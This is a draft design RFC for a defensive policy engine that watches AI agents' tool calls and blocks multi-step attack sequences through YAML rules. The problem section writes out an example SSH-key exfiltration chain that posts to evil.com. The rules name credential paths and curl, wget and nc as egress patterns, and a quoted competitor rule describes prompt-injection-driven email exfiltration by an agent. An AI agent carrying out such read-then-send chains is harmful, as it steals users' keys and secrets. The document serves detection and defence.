# RFC: Behavior Detection (Multi-Step Sequence Rules)

**Status:** Draft  
**Author:** Trevor / Clap  
**Target:** v0.3.0  
**Branch:** `feature/behavior-detection`

---

## Problem

Rampart currently evaluates each tool call independently. This catches dangerous individual commands (`rm -rf /`, `curl attacker.com`) but misses **multi-step attack patterns** where each step looks innocent on its own:

1. `cat ~/.ssh/id_rsa` → allowed (reading a file)
2. `curl -X POST https://evil.com -d @-` → allowed (curl isn't blocked by default)

Together, these two steps are an SSH key exfiltration. Neither triggers a deny rule individually. Rampart needs the ability to reason about **sequences of actions over time**.

## Competitive Landscape

### Invariant Labs (now Snyk)

Invariant built flow analysis using a **Python-inspired DSL**:

```python
raise "Exfiltration" if:
    (output: ToolOutput) -> (call: ToolCall)
    output is tool:get_inbox
    prompt_injection(output.content)
    call is tool:send_email
```

**Strengths:**
- Full Python expressiveness (arbitrary logic, regex, function calls)
- Built-in ML detectors (`prompt_injection()`, `moderated()`, `pii()`)
- Can inspect tool output content, not just tool names
- Dataflow tracking between tool calls

**Weaknesses:**
- Requires Python runtime (heavy dependency, slower eval)
- Rules are code, not config — harder to share, audit, version
- MCP-proxy-only — can't see shell commands or file operations outside MCP
- Deployed as a separate gateway process

### What Nobody Does

- **Cross-layer sequence detection.** No tool tracks sequences across shell commands + MCP tool calls + response content. Invariant only sees MCP. Sandbox tools see nothing. Anthropic's native permissions don't track sequences at all.
- **Declarative sequence rules.** Every existing solution uses imperative code (Python DSL, custom scripts). Nobody offers YAML-based sequence rules that are as easy to share as a Kubernetes manifest.

## Design Goals

1. **Declarative YAML syntax** — sequence rules are config, not code
2. **Cross-layer** — sequences can span shell commands, MCP tool calls, and response content
3. **Time-bounded** — sequences expire after a configurable window
4. **Zero new dependencies** — pure Go, no ML models required (but optional sidecar integration)
5. **Sub-millisecond overhead per event** — session state lookup must be fast
6. **Backward compatible** — existing policies work unchanged

## Non-Goals (v0.3.0)

- ML-based detection (prompt injection, PII) — keep as optional sidecar
- Cross-session correlation (track patterns across different agent sessions)
- Distributed state (multi-node Rampart deployments sharing session state)

## Proposed YAML Syntax

### Basic Sequence Rule

```yaml
rules:
  - name: block-ssh-exfiltration
    sequence:
      - tool: read
        when:
          path_matches: ["**/.ssh/**", "**/.gnupg/**"]
        capture: sensitive_read    # tag this step for reference
      - tool: [exec, fetch]
        when:
          command_matches: ["curl *", "wget *", "nc *", "python* -c *"]
        within: 120s              # must occur within 120s of step 1
    action: deny
    message: "Blocked: sensitive file read followed by network egress"
```

### How It Works

1. Agent reads `~/.ssh/id_rsa` → matches step 1, session records `sensitive_read` event with timestamp
2. 30 seconds later, agent runs `curl https://example.com` → matches step 2
3. Engine checks: is there a `sensitive_read` event within 120s? Yes → **deny**

### Multi-Step Chain (3+ steps)

```yaml
rules:
  - name: block-lateral-movement
    sequence:
      - tool: read
        when:
          path_matches: ["**/.kube/config", "**/.aws/credentials"]
        capture: cred_read
      - tool: exec
        when:
          command_matches: ["ssh *", "kubectl *", "aws *"]
        capture: remote_access
      - tool: exec
        when:
          command_matches: ["curl *", "wget *"]
        within: 300s
    action: deny
    message: "Blocked: credential read → remote access → data exfiltration chain"
```

### Response Content Matching

```yaml
rules:
  - name: block-secret-leak-in-response
    sequence:
      - tool: read
        when:
          path_matches: ["**/.env", "**/.env.*"]
        capture: env_read
      - response_matches: ["(?i)(api.?key|secret|token|password)\\s*[=:]\\s*\\S+"]
        within: 30s
    action: deny
    message: "Blocked: .env file content appearing in response"
```

### Negation (required step that DIDN'T happen)

```yaml
rules:
  - name: require-review-before-deploy
    sequence:
      - tool: exec
        when:
          command_matches: ["git diff *", "git log *"]
        capture: reviewed
        required: false           # this step is optional (absence triggers rule)
      - tool: exec
        when:
          command_matches: ["kubectl apply *", "docker push *", "terraform apply *"]
        without: reviewed         # deny if 'reviewed' did NOT happen first
        within: 600s
    action: require_approval
    message: "Deploy without review — approve?"
```

## Architecture

### Session State Store

```
┌─────────────────────────────────────────────┐
│                 Policy Engine                │
│                                              │
│  ┌──────────┐  ┌───────────┐  ┌──────────┐  │
│  │ Rule     │  │ Sequence  │  │ Session  │  │
│  │ Matcher  │  │ Evaluator │  │ Store    │  │
│  │ (exists) │  │ (new)     │  │ (new)    │  │
│  └──────────┘  └───────────┘  └──────────┘  │
│                      │              │        │
│                      │   ┌──────────┘        │
│                      ▼   ▼                   │
│               ┌──────────────┐               │
│               │ Event Ring   │               │
│               │ Buffer       │               │
│               │ (per session)│               │
│               └──────────────┘               │
└─────────────────────────────────────────────┘
```

**Session Store** (`internal/engine/session.go`):
- In-memory map: `sessionID → []TimestampedEvent`
- Ring buffer per session (configurable max, default 1000 events)
- Events expire based on max `within:` value across all sequence rules
- Keyed by agent identity (from hook's agent field or MCP client ID)

**Sequence Evaluator** (`internal/engine/sequence.go`):
- On each tool call, after single-rule evaluation:
  1. Record the event in the session store (tool, command, path, timestamp, tags)
  2. For each sequence rule, check if the current event matches any step
  3. If it matches a terminal step (last in sequence), walk backward through session history to verify all prior steps occurred within the time window
  4. If all steps match → apply the rule's action

**Performance target:** <100μs per sequence evaluation (bounded by session buffer size and number of sequence rules).

### Event Schema

```go
type SessionEvent struct {
    Timestamp time.Time
    Tool      string            // "exec", "read", "write", "fetch", "mcp", etc.
    Command   string            // normalized command or MCP tool name
    Path      string            // file path if applicable
    Agent     string            // agent identity
    Tags      map[string]string // capture tags from matched sequence steps
    Hash      string            // event hash for integrity
}
```

### Session Identification

How do we know which events belong to the same "session"?

- **Claude Code hooks:** The hook receives a session identifier (or we derive one from PID/TTY)
- **MCP proxy:** Each client connection is a session
- **OpenClaw shim:** Session comes from the OpenClaw session context
- **Fallback:** If no session ID is available, use a single default session (all events correlated)

## Comparison to Invariant

| Aspect | Invariant | Rampart (proposed) |
|--------|-----------|-------------------|
| **Syntax** | Python DSL (imperative) | YAML (declarative) |
| **Runtime** | Python + ML models | Pure Go |
| **Eval speed** | ~10-50ms (Python + inference) | Target <100μs |
| **Scope** | MCP tool calls only | Shell + MCP + response content |
| **ML detection** | Built-in (prompt injection, PII) | Optional sidecar |
| **Shareability** | Code snippets | Copy-paste YAML |
| **Data flow** | Can trace data between tool calls | Tracks tool sequences + captured tags |
| **Content inspection** | Full tool output analysis | Regex on responses (lighter weight) |

### Where Invariant Wins

- **Content-aware reasoning.** Invariant can say "if the output of tool A contains a prompt injection, block tool B." Rampart's response scanning sees the final LLM response, not intermediate tool outputs. This is a real gap.
- **Arbitrary logic.** Python DSL can express anything. YAML sequence rules are constrained by design (which is also a feature for auditability).

### Where Rampart Wins

- **Cross-layer visibility.** Shell command + MCP call + response content in one sequence rule. Invariant only sees MCP.
- **Performance.** Go vs Python, microseconds vs milliseconds.
- **Simplicity.** YAML rules can be reviewed by non-engineers, shared in blog posts, committed alongside code.
- **Enforcement depth.** OS-level interception means the sequence can't be bypassed by avoiding MCP.

## Implementation Plan

### Phase 1: Core (2 weeks)
- [ ] Session store with ring buffer and TTL expiry
- [ ] Sequence rule YAML parsing and validation
- [ ] Sequence evaluator (backward walk algorithm)
- [ ] Integration with existing `Engine.Evaluate()` flow
- [ ] Unit tests for all sequence matching logic

### Phase 2: Integration (1 week)
- [ ] Session ID extraction from hooks, MCP proxy, and shim
- [ ] `capture:` tag system for cross-step references
- [ ] `within:` time window enforcement
- [ ] Sequence events in audit trail
- [ ] `rampart test` support for sequence rules

### Phase 3: Polish (1 week)
- [ ] `without:` negation rules
- [ ] Response content matching in sequences
- [ ] Example sequence policies (exfiltration, lateral movement, privilege escalation)
- [ ] Documentation
- [ ] Policy linter support for sequence rules

## Open Questions

1. **Should `capture:` tags carry data?** E.g., capture the actual file path that was read, and reference it in later steps ("the curl command includes the same filename"). This adds power but complexity.

2. **Session persistence across restarts?** Current design is in-memory only. If Rampart restarts, session history is lost. Is this acceptable? For most attack patterns (seconds to minutes), yes. For slow-burn attacks (hours/days), no.

3. **Rate limiting / cardinality.** If an agent reads 10,000 files, the session buffer fills up. Ring buffer handles this, but the sequence evaluator needs to be efficient with large histories.

4. **Interaction with `require_approval`.** If a sequence rule triggers `require_approval`, what happens to the session state while waiting? Should the approval include context about which prior steps matched?

5. **Cross-agent correlation.** If Agent A reads secrets and Agent B (on the same machine) exfiltrates, should this be detectable? Probably not in v0.3.0, but worth designing for.

## Success Criteria

- [ ] Can detect SSH key exfiltration (read + curl) in <1ms
- [ ] Can detect credential theft chains (3+ steps) with time windows
- [ ] Zero performance regression for policies without sequence rules
- [ ] All existing tests pass unchanged
- [ ] At least 5 example sequence policies covering common attack patterns
- [ ] Documentation explaining when to use sequence rules vs single rules
